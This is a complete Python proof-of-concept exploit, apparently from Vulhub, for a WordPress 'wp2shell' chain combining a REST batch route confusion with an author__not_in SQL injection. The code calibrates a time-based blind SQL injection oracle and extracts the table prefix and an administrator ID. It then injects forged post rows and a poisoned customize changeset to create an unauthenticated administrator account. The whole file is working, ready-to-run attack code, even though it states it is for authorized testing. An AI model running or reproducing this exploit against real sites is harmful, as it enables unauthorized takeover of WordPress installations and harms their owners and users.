#!/usr/bin/env python3
"""Reproduce the WordPress wp2shell administrator-creation chain.

This proof-of-concept combines the REST API batch route confusion
(CVE-2026-63030) with the WP_Query ``author__not_in`` SQL injection
(CVE-2026-60137). It deliberately stops after creating and verifying a new
administrator account. It does not log in to wp-admin, upload plugins, or
execute operating system commands.

The technique was first published by sergiointel:
https://github.com/sergiointel/wp2shell-poc

For educational use and authorized testing only.
"""

import argparse
import hashlib
import json
import re
import secrets
import statistics
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from typing import Any, Dict, List, Optional, Sequence, Tuple


DEFAULT_DELAY = 0.4
DEFAULT_TIMEOUT = 30.0
MAX_INTEGER = (1 << 63) - 1
USER_AGENT = "Vulhub-wp2shell-PoC/1.0"


class ExploitError(RuntimeError):
    """Raised when the target cannot complete the expected exploit step."""


def info(message: str) -> None:
    """Print a progress message."""
    print(f"[*] {message}", flush=True)


def success(message: str) -> None:
    """Print a successful result."""
    print(f"[+] {message}", flush=True)


def positive_float(value: str) -> float:
    """Parse a positive floating-point command-line value."""
    try:
        number = float(value)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(f"invalid number: {value}") from exc
    if number <= 0:
        raise argparse.ArgumentTypeError("value must be greater than zero")
    return number


def target_url(value: str) -> str:
    """Validate and normalize an HTTP(S) target URL."""
    parsed = urllib.parse.urlsplit(value)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        raise argparse.ArgumentTypeError(
            "target must be an absolute HTTP(S) URL, for example http://127.0.0.1:8080"
        )
    if parsed.query or parsed.fragment:
        raise argparse.ArgumentTypeError("target must not contain a query string or fragment")

    path = parsed.path.rstrip("/")
    return urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, path, "", ""))


def build_parser() -> argparse.ArgumentParser:
    """Build the command-line interface."""
    parser = argparse.ArgumentParser(
        description=(
            "Reproduce CVE-2026-63030 and CVE-2026-60137 by creating a new "
            "WordPress administrator account without authentication."
        ),
        epilog=(
            "examples:\n"
            "  %(prog)s http://127.0.0.1:8080\n"
            "  %(prog)s http://127.0.0.1:8080 --check\n"
            "  %(prog)s http://127.0.0.1:8080 --username researcher "
            "--email researcher@example.com"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("target", type=target_url, help="base URL of the WordPress site")
    parser.add_argument(
        "-c",
        "--check",
        action="store_true",
        help="check the blind SQL injection only; do not create an account",
    )

    account = parser.add_argument_group("administrator account")
    account.add_argument(
        "--username",
        metavar="NAME",
        help="username to create (default: w2s_<random>)",
    )
    account.add_argument(
        "--password",
        metavar="PASSWORD",
        help="password for the new account (default: randomly generated)",
    )
    account.add_argument(
        "--email",
        metavar="ADDRESS",
        help="email for the new account (default: <username>@wp2shell.local)",
    )

    tuning = parser.add_argument_group("timing and network")
    tuning.add_argument(
        "--delay",
        type=positive_float,
        default=DEFAULT_DELAY,
        metavar="SECONDS",
        help=f"initial SQL sleep delay (default: {DEFAULT_DELAY})",
    )
    tuning.add_argument(
        "--timeout",
        type=positive_float,
        default=DEFAULT_TIMEOUT,
        metavar="SECONDS",
        help=f"HTTP request timeout (default: {DEFAULT_TIMEOUT:g})",
    )
    return parser


def sql_hex(value: str) -> str:
    """Encode a string as a MySQL hexadecimal literal."""
    return f"0x{value.encode().hex()}" if value else "''"


def post_row(
    post_id: int,
    content: str,
    title: str,
    status: str,
    name: str,
    parent: int,
    post_type: str,
) -> str:
    """Build one forged ``wp_posts`` row for a UNION SELECT."""
    timestamp = sql_hex("2020-01-01 00:00:00")
    return ",".join(
        (
            str(post_id),
            "1",
            timestamp,
            timestamp,
            sql_hex(content),
            sql_hex(title),
            "''",
            sql_hex(status),
            sql_hex("closed"),
            sql_hex("closed"),
            "''",
            sql_hex(name),
            "''",
            "''",
            timestamp,
            timestamp,
            "''",
            str(parent),
            "''",
            "0",
            sql_hex(post_type),
            "''",
            "0",
        )
    )


class Wp2ShellExploit:
    """Implement the timing oracle and administrator-creation chain."""

    def __init__(self, base_url: str, delay: float, timeout: float) -> None:
        self.base_url = base_url
        self.batch_url = f"{base_url}/?rest_route=/batch/v1"
        self.sleep_delay = delay
        self.timeout = timeout
        self.threshold: Optional[float] = None
        self.retry_band: Optional[float] = None

    def request(self, url: str) -> bytes:
        """Send a GET request and return its response body."""
        request = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
        with urllib.request.urlopen(request, timeout=self.timeout) as response:
            return response.read()

    def send_batch(self, inner_requests: Sequence[Dict[str, Any]]) -> bytes:
        """Wrap sub-requests in the nested batch that triggers route confusion.

        The first outer sub-request cannot be parsed. WordPress records its
        validation error without adding the corresponding route match, shifting
        the internal arrays out of alignment. The next sub-request is therefore
        executed under the batch handler and supplies the attacker-controlled
        inner request list.
        """
        payload = {
            "requests": [
                {"method": "POST", "path": "http://:"},
                {
                    "method": "POST",
                    "path": "/wp/v2/posts",
                    "body": {"requests": inner_requests},
                },
                {"method": "POST", "path": "/batch/v1"},
            ]
        }
        request = urllib.request.Request(
            self.batch_url,
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json", "User-Agent": USER_AGENT},
            method="POST",
        )
        with urllib.request.urlopen(request, timeout=self.timeout) as response:
            return response.read()

    def probe_time(self, condition: str) -> float:
        """Measure a boolean condition using the time-based SQLi oracle."""
        query = f"SELECT IF(({condition}),SLEEP({self.sleep_delay}),0)"
        started = time.perf_counter()
        self.send_batch(
            [
                {"method": "GET", "path": "http://:"},
                {
                    "method": "GET",
                    "path": "/wp/v2/categories?"
                    + urllib.parse.urlencode({"author_exclude": query}),
                },
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
        )
        return time.perf_counter() - started

    def calibrate(self) -> Tuple[float, float]:
        """Calibrate the timing oracle and confirm that the target is vulnerable."""
        for _ in range(3):
            fast_samples = [self.probe_time("1=0") for _ in range(5)]
            slow_samples = [self.probe_time("1=1") for _ in range(3)]
            fast = statistics.median(fast_samples)
            slow = statistics.median(slow_samples)
            jitter = statistics.median(
                abs(sample - fast) for sample in fast_samples
            )
            if slow - fast > max(0.06, jitter * 8):
                self.threshold = (fast + slow) / 2
                self.retry_band = max(0.02, jitter * 3)
                return fast, slow
            self.sleep_delay *= 2

        raise ExploitError("target does not appear to be vulnerable")

    def condition_is_true(self, condition: str) -> bool:
        """Evaluate a boolean SQL condition, retrying measurements near the threshold."""
        if self.threshold is None or self.retry_band is None:
            raise ExploitError("timing oracle has not been calibrated")

        elapsed = self.probe_time(condition)
        if abs(elapsed - self.threshold) > self.retry_band:
            return elapsed > self.threshold
        samples = [elapsed, self.probe_time(condition), self.probe_time(condition)]
        return statistics.median(samples) > self.threshold

    def get_scalar(self, query: str, max_length: int) -> str:
        """Extract a printable string through binary-searched blind SQL injection."""
        expression = f"COALESCE(({query}),'')"
        lower, upper = 0, max_length
        while lower < upper:
            middle = (lower + upper + 1) // 2
            if self.condition_is_true(
                f"CHAR_LENGTH({expression}) >= {middle}"
            ):
                lower = middle
            else:
                upper = middle - 1

        result = []
        for position in range(1, lower + 1):
            low, high = 32, 126
            while low < high:
                middle = (low + high + 1) // 2
                condition = (
                    f"ASCII(SUBSTRING({expression},{position},1)) >= {middle}"
                )
                if self.condition_is_true(condition):
                    low = middle
                else:
                    high = middle - 1
            result.append(chr(low))
        return "".join(result)

    def get_integer(self, query: str) -> int:
        """Extract a non-negative integer through blind SQL injection."""
        expression = f"COALESCE(({query}),0)"
        lower, upper = 0, 1
        while self.condition_is_true(f"{expression} >= {upper}"):
            lower = upper
            if upper >= MAX_INTEGER:
                raise ExploitError("integer extraction exceeded the supported range")
            upper = min(upper * 2, MAX_INTEGER)

        while lower < upper:
            middle = (lower + upper + 1) // 2
            if self.condition_is_true(f"{expression} >= {middle}"):
                lower = middle
            else:
                upper = middle - 1
        return lower

    def public_post_link(self) -> str:
        """Return the link of one published post used to seed oEmbed entries."""
        url = f"{self.base_url}/?rest_route=/wp/v2/posts&per_page=1&_fields=link"
        items = json.loads(self.request(url))
        if (
            not isinstance(items, list)
            or not items
            or not isinstance(items[0], dict)
            or not items[0].get("link")
        ):
            raise ExploitError(
                "no public post found; complete the WordPress installation first"
            )
        return str(items[0]["link"])

    def seed_oembed_posts(self, public_post_link: str) -> Tuple[str, List[str]]:
        """Create three real oEmbed cache posts and return their source URLs."""
        token = secrets.token_hex(6)
        public_post = urllib.parse.urlsplit(public_post_link)
        embed_urls = [
            urllib.parse.urlunsplit(
                (
                    public_post.scheme,
                    public_post.netloc,
                    public_post.path,
                    public_post.query,
                    f"{token}{index}",
                )
            )
            for index in range(3)
        ]
        seed_content = "".join(
            f'[embed width="500" height="750"]{url}[/embed]'
            for url in embed_urls
        )
        seed_query = (
            "1) AND 1=0 UNION ALL SELECT "
            + post_row(0, seed_content, "seed", "publish", "seed", 0, "post")
            + " -- -"
        )
        self.send_batch(
            [
                {"method": "GET", "path": "http://:"},
                {
                    "method": "GET",
                    "path": "/wp/v2/widgets?"
                    + urllib.parse.urlencode(
                        {
                            "author_exclude": seed_query,
                            "per_page": -1,
                            "orderby": "none",
                            "context": "view",
                        }
                    ),
                },
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
        )
        return token, embed_urls

    def recover_database_context(self) -> Tuple[str, str, int]:
        """Recover the posts table, table prefix, and an administrator user ID."""
        posts_table = self.get_scalar(
            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
            "WHERE TABLE_SCHEMA=DATABASE() "
            "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 "
            "ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1",
            64,
        )
        if not re.fullmatch(r"[A-Za-z0-9_$]+_posts", posts_table):
            raise ExploitError("could not recover a valid WordPress posts table")

        table_prefix = posts_table[:-5]
        administrator_id = self.get_integer(
            f"SELECT u.ID FROM `{table_prefix}users` u "
            f"JOIN `{table_prefix}usermeta` m ON m.user_id=u.ID "
            f"WHERE m.meta_key={sql_hex(table_prefix + 'capabilities')} "
            "AND INSTR(m.meta_value,"
            + sql_hex('s:13:"administrator";b:1;')
            + ")>0 ORDER BY u.ID LIMIT 1"
        )
        if administrator_id < 1:
            raise ExploitError("could not locate an existing administrator")
        return posts_table, table_prefix, administrator_id

    def recover_cache_post_ids(
        self, posts_table: str, embed_urls: Sequence[str]
    ) -> List[int]:
        """Recover the database IDs of the newly created oEmbed cache posts."""
        embed_size = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'
        cache_post_ids = []
        for embed_url in embed_urls:
            cache_key = hashlib.md5((embed_url + embed_size).encode()).hexdigest()
            post_id = self.get_integer(
                f"SELECT ID FROM `{posts_table}` "
                "WHERE post_type=0x6f656d6265645f6361636865 "
                f"AND post_name=0x{cache_key.encode().hex()} "
                "ORDER BY ID DESC LIMIT 1"
            )
            if post_id < 1:
                raise ExploitError("could not recover an oEmbed cache post ID")
            cache_post_ids.append(post_id)

        if len(cache_post_ids) != 3 or len(set(cache_post_ids)) != 3:
            raise ExploitError("oEmbed cache seeding did not create three unique posts")
        return cache_post_ids

    def create_administrator(
        self,
        administrator_id: int,
        cache_post_ids: Sequence[int],
        embed_urls: Sequence[str],
        username: str,
        password: str,
        email: str,
    ) -> None:
        """Publish a forged changeset and create a new administrator account."""
        outer_loop_id = 1_800_000_000 + secrets.randbelow(100_000_000)
        nav_item_id = outer_loop_id + 1
        inner_loop_id = outer_loop_id + 2

        changeset = json.dumps(
            {
                f"nav_menu_item[{nav_item_id}]": {
                    "value": {
                        "object_id": 0,
                        "object": "",
                        "menu_item_parent": 0,
                        "position": 0,
                        "type": "custom",
                        "title": "proof",
                        "url": "https://github.com/vulhub/vulhub",
                        "target": "",
                        "attr_title": "",
                        "description": "proof",
                        "classes": "",
                        "xfn": "",
                        "status": "publish",
                        "nav_menu_term_id": 0,
                        "_invalid": False,
                    },
                    "type": "nav_menu_item",
                    "user_id": administrator_id,
                }
            },
            separators=(",", ":"),
        )

        poisoned_posts = (
            post_row(
                0,
                f'[embed width="500" height="750"]{embed_urls[1]}[/embed]',
                "trigger",
                "publish",
                "trigger",
                0,
                "post",
            ),
            post_row(
                cache_post_ids[0],
                changeset,
                "changeset",
                "future",
                str(uuid.uuid4()),
                outer_loop_id,
                "customize_changeset",
            ),
            post_row(
                outer_loop_id,
                "outer",
                "outer",
                "draft",
                "outer",
                cache_post_ids[0],
                "post",
            ),
            post_row(
                cache_post_ids[1],
                "",
                "cache",
                "publish",
                "cache",
                cache_post_ids[0],
                "post",
            ),
            post_row(
                nav_item_id,
                "nav",
                "nav",
                "publish",
                "nav",
                cache_post_ids[2],
                "nav_menu_item",
            ),
            post_row(
                cache_post_ids[2],
                "parse",
                "parse",
                "parse",
                "parse",
                inner_loop_id,
                "request",
            ),
            post_row(
                inner_loop_id,
                "inner",
                "inner",
                "draft",
                "inner",
                cache_post_ids[2],
                "post",
            ),
        )
        escalation_query = (
            "1) AND 1=0 UNION ALL SELECT "
            + " UNION ALL SELECT ".join(poisoned_posts)
            + " -- -"
        )
        new_administrator = {
            "username": username,
            "email": email,
            "password": password,
            "roles": ["administrator"],
        }

        self.send_batch(
            [
                {"method": "GET", "path": "http://:"},
                {
                    "method": "GET",
                    "path": "/wp/v2/widgets?"
                    + urllib.parse.urlencode(
                        {
                            "author_exclude": escalation_query,
                            "per_page": -1,
                            "orderby": "none",
                            "context": "view",
                        }
                    ),
                },
                {"method": "GET", "path": "/wp/v2/posts"},
                {
                    "method": "POST",
                    "path": "/wp/v2/users",
                    "body": new_administrator,
                },
                {
                    "method": "POST",
                    "path": "/wp/v2/users",
                    "body": new_administrator,
                },
            ]
        )

    def administrator_exists(self, table_prefix: str, username: str) -> bool:
        """Verify that the user exists and has the administrator role."""
        condition = (
            f"EXISTS(SELECT 1 FROM `{table_prefix}users` u "
            f"JOIN `{table_prefix}usermeta` m ON m.user_id=u.ID "
            f"WHERE u.user_login={sql_hex(username)} "
            f"AND m.meta_key={sql_hex(table_prefix + 'capabilities')} "
            "AND INSTR(m.meta_value,"
            + sql_hex('s:13:"administrator";b:1;')
            + ")>0)"
        )
        return self.condition_is_true(condition)


def validate_account_options(
    parser: argparse.ArgumentParser, args: argparse.Namespace
) -> None:
    """Reject contradictory or empty account-related options."""
    supplied = (args.username, args.password, args.email)
    if args.check and any(value is not None for value in supplied):
        parser.error("account options cannot be used together with --check")
    for option, value in (
        ("--username", args.username),
        ("--password", args.password),
        ("--email", args.email),
    ):
        if value is not None and not value:
            parser.error(f"{option} cannot be empty")


def run(args: argparse.Namespace) -> None:
    """Run vulnerability detection and, unless requested otherwise, exploitation."""
    exploit = Wp2ShellExploit(args.target, args.delay, args.timeout)

    info(f"Target: {args.target}")
    info("Calibrating the time-based SQL injection oracle")
    fast, slow = exploit.calibrate()
    success(
        "Target is vulnerable "
        f"(baseline: {fast:.3f}s, delayed: {slow:.3f}s, SQL delay: {exploit.sleep_delay:g}s)"
    )
    if args.check:
        info("Check-only mode selected; no administrator account was created")
        return

    info("Seeding three database-backed oEmbed cache posts")
    public_post = exploit.public_post_link()
    token, embed_urls = exploit.seed_oembed_posts(public_post)

    info("Extracting the WordPress table prefix and an administrator user ID")
    posts_table, table_prefix, administrator_id = exploit.recover_database_context()
    success(f"Posts table: {posts_table}")
    success(f"Existing administrator ID: {administrator_id}")

    info("Recovering the oEmbed cache post IDs")
    cache_post_ids = exploit.recover_cache_post_ids(posts_table, embed_urls)
    success("oEmbed cache post IDs: " + ", ".join(map(str, cache_post_ids)))

    username = args.username or f"w2s_{token}"
    password = args.password or f"W2s!{secrets.token_urlsafe(15)}"
    email = args.email or f"{username}@wp2shell.local"

    info("Publishing the forged changeset and creating the administrator")
    exploit.create_administrator(
        administrator_id,
        cache_post_ids,
        embed_urls,
        username,
        password,
        email,
    )

    info("Verifying the new account through blind SQL injection")
    if not exploit.administrator_exists(table_prefix, username):
        raise ExploitError("the administrator account could not be verified")

    success("Administrator account created and verified")
    print(f"    Username: {username}")
    print(f"    Password: {password}")
    print(f"    Email:    {email}")


def main(argv: Optional[Sequence[str]] = None) -> int:
    """Parse command-line arguments and return a process exit code."""
    parser = build_parser()
    args = parser.parse_args(argv)
    validate_account_options(parser, args)

    try:
        run(args)
    except KeyboardInterrupt:
        print("\n[-] Interrupted by user", file=sys.stderr)
        return 130
    except (ExploitError, json.JSONDecodeError) as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 1
    except urllib.error.HTTPError as exc:
        print(f"[-] HTTP request failed: {exc.code} {exc.reason}", file=sys.stderr)
        return 1
    except urllib.error.URLError as exc:
        print(f"[-] Network request failed: {exc.reason}", file=sys.stderr)
        return 1
    except TimeoutError:
        print("[-] Network request timed out", file=sys.stderr)
        return 1

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
